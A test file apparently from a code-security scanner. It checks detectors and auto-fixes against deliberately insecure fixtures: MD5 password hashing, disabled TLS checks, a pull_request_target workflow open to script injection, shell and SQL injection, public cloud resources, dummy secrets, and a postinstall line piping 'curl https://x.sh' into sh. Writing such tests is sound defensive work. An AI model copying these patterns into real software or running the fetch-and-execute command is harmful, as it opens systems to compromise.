import { describe, expect, it } from "vitest";
import { weakCrypto, insecureConfig } from "../src/checks/hardening.js";
import { dockerfileSecurity, ciSecurity, iacSecurity } from "../src/checks/config-files.js";
import { pythonSecurity } from "../src/checks/python.js";
import { supplyChain } from "../src/checks/supply-chain.js";
import { secretsInRepo } from "../src/checks/secrets.js";
import { guardPatch } from "../src/diffGuard.js";
import { applyPatch } from "../src/apply.js";
import type { Check, RepoSnapshot } from "../src/types.js";

const repo = (files: Record<string, string>): RepoSnapshot => ({ name: "t", files: Object.entries(files).map(([path, content]) => ({ path, content })) });
const titles = async (c: Check, r: RepoSnapshot) => (await c.detect({ repo: r })).map((f) => f.title);

/** Fix → guard accepts → the fixed findings are gone. */
async function fixRoundTrip(c: Check, r: RepoSnapshot, gone: RegExp) {
  const patch = await c.fix!({ repo: r }, await c.detect({ repo: r }));
  expect(patch).not.toBeNull();
  expect(guardPatch(r, patch!).ok).toBe(true);
  const after = applyPatch(r, patch!);
  expect((await titles(c, after)).filter((t) => gone.test(t))).toEqual([]);
  return after;
}

describe("weak-crypto and insecure-config", () => {
  it("flags weak hashing, predictable tokens and broken ciphers; leaves checksums alone", async () => {
    const code = `const crypto = require("crypto");
function savePassword(password) { return crypto.createHash("md5").update(password).digest("hex"); }
function etag(body) { return crypto.createHash("md5").update(body).digest("hex"); }
const resetToken = Math.random().toString(36).slice(2);
const c = crypto.createCipheriv("aes-128-ecb", key, null);
bcrypt.hash(pw, 6);`;
    const t = await titles(weakCrypto, repo({ "a.js": code }));
    expect(t).toEqual(["Passwords hashed with MD5", "Predictable random value used for a security token", "Weak cipher mode aes-128-ecb", "bcrypt cost 6 is too low"]);
  });

  it("flags insecure settings and fixes the TLS switch", async () => {
    const code = `const https = require("https"); const express = require("express"); const session = require("express-session");
const agent = new https.Agent({ rejectUnauthorized: false });
app.use(session({ secret: "keyboard cat", cookie: { secure: false } }));
app.use(cors({ origin: true, credentials: true }));
app.use(express.static(__dirname));
if (req.body.password === "admin123") login();`;
    const r = repo({ "server.js": code });
    expect(await titles(insecureConfig, r)).toEqual([
      "TLS certificate checks are turned off",
      "Session secret written in the code",
      "Session cookie sent over plain HTTP (secure: false)",
      "Any website can make logged-in requests (CORS reflects every origin with credentials)",
      "The whole project folder is served to the web",
      "Password checked against a value written in the code",
    ]);
    const after = await fixRoundTrip(insecureConfig, r, /^TLS/);
    expect(after.files[0].content).toContain("rejectUnauthorized: true");
  });
});

describe("dockerfile, CI and infrastructure", () => {
  it("hardens a root Node container", async () => {
    const r = repo({ Dockerfile: "FROM node:latest\nWORKDIR /app\nCOPY . .\nENV API_KEY=abcd1234secret\nRUN npm ci\nCMD [\"node\", \"server.js\"]\n" });
    expect(await titles(dockerfileSecurity, r)).toEqual(["Base image not pinned to a version", "Container runs as root", "Secret baked into the image (ENV)", "COPY . without a .dockerignore"]);
    const after = await fixRoundTrip(dockerfileSecurity, r, /root|dockerignore/);
    expect(after.files.find((f) => f.path === "Dockerfile")!.content).toMatch(/USER node\nCMD/);
  });

  it("catches pwn requests and script injection, and adds read-only permissions", async () => {
    const wf = `on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
      - run: echo "\${{ github.event.pull_request.title }}"
      - uses: some/action@v1
`;
    const r = repo({ ".github/workflows/ci.yml": wf });
    expect((await ciSecurity.detect({ repo: r })).map((f) => f.severity)).toEqual(["critical", "high", "low", "medium"]);
    await fixRoundTrip(ciSecurity, r, /default permissions/);
  });

  it("reads CloudFormation, Terraform and Kubernetes", async () => {
    const cfn = `AWSTemplateFormatVersion: "2010-09-09"
Resources:
  Uploads:
    Type: AWS::S3::Bucket
    Properties:
      AccessControl: PublicReadWrite
  AppRole:
    Type: AWS::IAM::Role
    Properties:
      Policies:
        - PolicyName: all
          PolicyDocument:
            Statement:
              - Effect: Allow
                Action: "*"
                Resource: "*"
  Sg:
    Type: AWS::EC2::SecurityGroup
    Properties:
      SecurityGroupIngress:
        - { IpProtocol: tcp, FromPort: 22, ToPort: 22, CidrIp: 0.0.0.0/0 }
        - { IpProtocol: tcp, FromPort: 443, ToPort: 443, CidrIp: 0.0.0.0/0 }
`;
    const tf = `resource "aws_db_instance" "db" {\n  publicly_accessible = true\n}\n`;
    const k8s = `apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  template:\n    spec:\n      containers:\n        - name: web\n          image: web:1.2\n          securityContext:\n            privileged: true\n`;
    const t = await titles(iacSecurity, repo({ "template.yaml": cfn, "main.tf": tf, "k8s/web.yaml": k8s }));
    expect(t).toEqual([
      "S3 bucket is public (Uploads)",
      "IAM policy allows every action on every resource (AppRole)",
      "SSH (22) open to the internet (Sg)",
      "Database reachable from the internet",
      "Privileged container (web)",
    ]);
  });
});

describe("python, supply chain and secrets", () => {
  it("follows request input in Python and skips safe code", async () => {
    const py = `from flask import request
import os, yaml, requests
q = request.args.get("q")
os.system(f"grep {q} data.txt")
cur.execute("SELECT * FROM t WHERE id = %s" % q)
cur.execute("SELECT * FROM t WHERE id = %s", (q,))
requests.get(q)
yaml.load(open("c.yml"), Loader=yaml.SafeLoader)
app.run(debug=True)
`;
    expect(await titles(pythonSecurity, repo({ "app.py": py }))).toEqual([
      "Shell command built from strings",
      "SQL built from strings",
      "Request input chooses where the server sends a request (SSRF)",
      "Flask debug mode on",
    ]);
  });

  it("flags risky dependency sources and missing lockfiles", async () => {
    const pkg = JSON.stringify({ dependencies: { a: "http://x.test/a.tgz", b: "github:o/b", c: "*", express: "^4.21.2" }, scripts: { postinstall: "curl https://x.sh | sh" } }, null, 2);
    const t = await titles(supplyChain, repo({ "package.json": pkg }));
    expect(t).toEqual([
      "Dependency downloaded over plain HTTP: a",
      "Git dependency not pinned to a commit: b",
      "Dependency accepts any version: c",
      "Install script downloads or runs code (postinstall)",
      "No lockfile committed",
    ]);
  });

  it("finds keys in .env, config files and database URLs, but only rewrites code", async () => {
    const pw = "s3cr" + "etPassw0rd99";
    const r = repo({
      ".env": `DATABASE_PASSWORD=${pw}\nPORT=3000\n`,
      ".env.example": "DATABASE_PASSWORD=\n",
      "docker-compose.yml": `services:\n  db:\n    environment:\n      POSTGRES_PASSWORD: ${pw}\n      OTHER: \${FROM_ENV}\n`,
      "db.js": `const url = "postgres://app:${pw}@db.internal:5432/app";\n`,
      "k.js": `const k = "${"ghp_" + "a".repeat(36)}";\n`,
    });
    expect(await titles(secretsInRepo, r)).toEqual(["Secret in a committed .env file", "Secret in a config file", "Database URL with a password", "GitHub token in source"]);
    const patch = await secretsInRepo.fix!({ repo: r }, []);
    expect(patch === null || patch.edits.every((e) => /\.js$|\.env\.example$|\.gitignore$/.test(e.path))).toBe(true);
  });
});
